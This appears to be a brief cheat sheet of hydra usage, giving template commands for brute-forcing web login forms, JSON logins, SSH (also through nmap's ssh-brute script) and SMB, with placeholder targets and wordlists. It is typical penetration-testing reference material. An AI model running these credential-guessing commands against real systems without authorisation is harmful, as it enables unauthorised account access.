# hydra

```bash
hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-o FILE] [-t THREADS] [-M FILE] service://IP [-s PORT] [-vV]

-e nsr: try "n" null password, "s" login as pass and/or "r" reversed login
-S: connect via SSL
-C: file containing format user:pass
-t <number of tasks> | default: 16

# post-form ^USER ^PASS^
hydra -L <> -P <> IP -s PORT http-form-post "<path-to-login-form>:<burp-params>:<error-message>:H=Cookie:<COOKIE>" [-vV]
hydra -L <> -P <> IP -s PORT https-form-post "<path-to-login-form>:<burp-params>:<error-message>:H=Cookie:<COOKIE>" [-vV]
# json based
| need to escape ':'
hydra -L <> -P <> IP http-form-post "/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\":<ERROR>:H=Content-Type: application/json:}"

# ssh
nmap IP -p 22 --script ssh-brute --script-args userdb=user,passdb=pass
hydra -L USER -P PASS ssh://IP -t 4 -s 22

# smb
hydra -L USER -P PASS smb://IP
```
